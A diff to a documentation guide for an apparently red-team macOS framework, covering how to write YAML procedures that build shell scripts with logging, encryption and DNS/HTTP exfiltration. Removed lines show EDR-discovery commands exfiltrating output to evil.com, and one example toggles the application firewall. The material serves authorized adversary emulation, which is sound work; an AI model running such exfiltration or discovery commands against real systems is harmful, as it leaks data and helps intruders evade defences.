@@ -1,13 +1,10 @@
 # How to Add a New Procedure in YAML
 
-**Quick Start**: YAML procedures make it easy to create LOTL shell scripts packaged with built-in logging, otput formmating, encoding, encryption, and exfiltration techniques with in just a few minutes.
+**Quick path:** [Create a New TTP Fast.md](Create%20a%20New%20TTP%20Fast.md) (copy template, fill metadata, build, `--lint-local`).
 
-**Need the short version?** Use `docs/Guides/How To/Create a New TTP Fast.md` for a minimal workflow.
+YAML procedures compile to shell on top of `base.sh`, inheriting logging, encoding, encryption, and optional exfiltration (DNS/HTTP) from the base runtime.
 
-## Overview
-
-YAML procedures are used to build shell scripts on top of `base.sh` so you can take advantage of additional output encoding, logging, formatting, and exfiltration capabilities over DNS, and HTTP. 
-
+**End-to-end checklist:** edit YAML → `python3 cicd/build/build_shell_procedure.py --validate` → `python3 cicd/build/build_shell_procedure.py <file>` (build runs **`sh -n`** automatically) → optional `./attackmacos/attackmacos.sh --lint-local ...` to re-check without rebuilding → optional `bash attackmacos/ttp/<tactic>/shell/<procedure_name>.sh --help`. Sourcing and MITRE alignment: [R&D References.md](../../R&D%20References.md). Parent index: [Guides README.md](../README.md).
 
 ## YAML Structure Order
 
@@ -26,7 +23,7 @@ These fields identify your technique and provide basic information.
 
 | Field | Type | Required | Description | Example |
 |-------|------|----------|-------------|---------|
-| **procedure_name** | string | ✅ | Format: `NNNN_technique_name` (no T prefix) | `1518_security_software` |
+| **procedure_name** | string | ✅ | Stable snake_case name for the generated script | `security_software`, `defaults_domains` |
 | **ttp_id** | string | ✅ | MITRE ATT&CK technique ID (T + 4 digits, optional sub-technique) | `T1518`, `T1518.001` |
 | **tactic** | enum | ✅ | MITRE ATT&CK tactic | `Discovery` |
 | **guid** | string | ✅ | UUID4 format | `456e7890-e12b-34c5-d678-901234567890` |
@@ -40,13 +37,15 @@ These fields identify your technique and provide basic information.
 
 ```yaml
 ---
-procedure_name: 1518_edr_discovery
+procedure_name: security_software
 tactic: Discovery
-guid: $GUID
-intent: Discover EDR software installed on macOS systems
+guid: 3349e821-b561-4407-a4f7-45ff1fb2900b
+intent: Discover EDR and security software installed on macOS systems
 author: "@darmado | https://x.com/darmad0"
 version: "1.0.0"
 created: "2025-05-28"
+platform:
+  - darwin
 ```
 </details>
 
@@ -62,7 +61,7 @@ The `arguments` section defines command-line options that users can specify when
 | **description** | string | ✅ | Help text (5-100 chars) - use adversary language | `Discover EDR processes using ps` |
 | **type** | string | ❌ | Only for value args: `string` or `integer` | `string` |
 | **input_required** | boolean | ❌ | Whether this argument requires user.arg (default: false) | `true` |
-| **execute_function** | array | ✅ | Functions to call when option used | `[discover_edr_processes]` |
+| **execute_function** | array | ⚠️ | Functions when the option runs; use `[]` only for input-only flags that never execute technique functions (rare). Prefer every actionable flag call at least one function. | `[discover_edr_processes]` |
 
 ### Arguments with User Input
 
@@ -130,6 +129,7 @@ appfw_function() {
     local output=$("$CMD_SOCKETFILTERFW" --setglobalstate "$socketfilter_input" 2>&1)
     $CMD_PRINTF "APPFW_RESULT|%s\n" "$output"
 }
+```
 
 <details>
 <summary>Arguments Section Example</summary>
@@ -644,14 +644,16 @@ language: ["jxa"]
 
 ```yaml
 ---
-procedure_name: 1518_edr_discovery
+procedure_name: edr_discovery_example
 ttp_id: T1518
 tactic: Discovery
-guid: $GUID
+guid: 00000000-0000-4000-8000-000000000001
 intent: Discover EDR software installed on macOS systems
 author: "@darmado | https://x.com/darmad0"
 version: "1.0.0"
 created: "2025-05-28"
+platform:
+  - darwin
 
 procedure:
   arguments:
@@ -728,45 +730,58 @@ procedure:
 
 ## Build and Test Process
 
-### GitHub Actions (Recommended)
+### Local build (required before merge)
 
-GitHub Actions automates the entire validation and build process. Simply create a Pull Request to trigger automated testing:
+There is **no** repo-hosted GitHub Actions workflow that builds procedures for you today; validation is **local** (or your own CI).
 
-1. **Fork Repository**: Fork attack-macOS on GitHub (click Fork button)
-2. **Clone Your Fork**: `git clone https://github.com/YOUR_USERNAME/attack-macOS.git`
-3. **Create YAML**: Add your YAML file to the appropriate directory
-4. **Create Pull Request**: Push changes and create PR - GitHub Actions handles the rest
-
-<details>
-<summary>Git Workflow Example</summary>
+From the repository root, using the project venv:
 
 ```bash
-# Clone your forked repository
-git clone https://github.com/YOUR_USERNAME/attack-macOS.git
-cd attack-macOS
+python3 -m venv cicd/venv
+cicd/venv/bin/pip install pyyaml jsonschema
+cicd/venv/bin/python3 cicd/build/build_shell_procedure.py --validate attackmacos/core/config/<procedure_name>.yml
+cicd/venv/bin/python3 cicd/build/build_shell_procedure.py attackmacos/core/config/<procedure_name>.yml
+```
 
-# Create feature branch
-git checkout -b feature/1518-edr-discovery
+Regenerate and overwrite an existing generated script:
 
-# Add your YAML file
-git add attackmacos/ttp/discovery/security_software/1518_edr_discovery.yml
-git commit -m "Add EDR discovery technique T1518"
-git push origin feature/1518-edr-discovery
+```bash
+cicd/venv/bin/python3 cicd/build/build_shell_procedure.py --force attackmacos/core/config/<procedure_name>.yml
+```
 
-# Create pull request (triggers GitHub Actions automatically)
-gh pr create --title "Add EDR Discovery Technique" --body "Implements T1518 for EDR discovery"
+**Syntax:** Successful build already runs **`sh -n`** on the output script (equivalent to `--lint-local`). Optional re-check:
+
+```bash
+./attackmacos/attackmacos.sh --lint-local --tactic <tactic_slug> --ttp <procedure_name>
+```
+
+Use the tactic **slug** from `./attackmacos/attackmacos.sh --help` (for example `discovery`).
+
+### Git workflow (optional)
+
+Use your normal fork/branch/PR process. Add and commit **both** `attackmacos/core/config/<procedure_name>.yml` and the generated `attackmacos/ttp/<tactic>/shell/<procedure_name>.sh` unless your team policy excludes generated files.
+
+<details>
+<summary>Example git commands</summary>
+
+```bash
+git checkout -b feature/add-my-procedure
+git add attackmacos/core/config/my_procedure.yml attackmacos/ttp/discovery/shell/my_procedure.sh
+git commit -m "Add my_procedure TTP"
+git push -u origin feature/add-my-procedure
 ```
 </details>
 
-### Local Development (Alternative)
+### Runtime testing (operator discretion)
 
-For local testing and development:
+After `--lint-local` passes, you may run the generated script in a lab with explicit consent. Example:
 
-1. **Create YAML**: Follow the structure above
-2. **Validate**: `python3 build_procedure.py --validate your_procedure.yml`
-3. **Build**: `python3 build_procedure.py your_procedure.yml`
-4. **Test**: Run the generated script with various options
-5. **Verify JSON**: Test with `--format json` to ensure proper integration
+```bash
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --help
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --all
+```
+
+Use `--format json`, encoding, encryption, and exfil flags only in environments where that behavior is authorized.
 
 ## Built-in Output Handling
 
@@ -783,45 +798,25 @@ Simply use `printf` in your functions to output data - the framework handles the
 <details>
 <summary>Script Usage Examples</summary>
 
-**Basic Discovery:**
+**Basic discovery (replace `<procedure_name>` and path with your tactic folder):**
 ```bash
-# Run basic EDR process discovery
-./1518_edr_discovery.sh --edr-processes
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --help
 
-# Output JSON format
-./1518_edr_discovery.sh --edr-processes --format json
-
-# Run all discovery functions
-./1518_edr_discovery.sh --edr-processes --edr-files
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --format json
 ```
 
-**Advanced Output Handling:**
+**Advanced output handling (authorized lab only):**
 ```bash
-# Encode output with base64
-./1518_edr_discovery.sh --edr-processes --encode base64
-
-# Encrypt output with AES
-./1518_edr_discovery.sh --edr-processes --encrypt aes
-
-# Exfiltrate via DNS
-./1518_edr_discovery.sh --edr-processes --exfil-dns evil.com
-
-# Exfiltrate via HTTP with JSON formatting
-./1518_edr_discovery.sh --edr-processes --format json --exfil-http http://evil.com/collect
-
-# Combine encoding, encryption, and exfiltration
-./1518_edr_discovery.sh --edr-processes --encode base64 --encrypt aes --exfil-dns evil.com
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --encode base64
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --encrypt aes
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --exfil-dns example.com
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --format json --exfil-http https://example.com/collect
 ```
 
-**Logging and Verbose Output:**
+**Logging and verbose output:**
 ```bash
-# Enable logging to file
-./1518_edr_discovery.sh --edr-processes --log
-
-# Verbose output for debugging
-./1518_edr_discovery.sh --edr-processes --verbose
-
-# Debug mode with detailed execution info
-./1518_edr_discovery.sh --edr-processes --debug
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --log
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --verbose
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --option --debug
 ```
 </details>
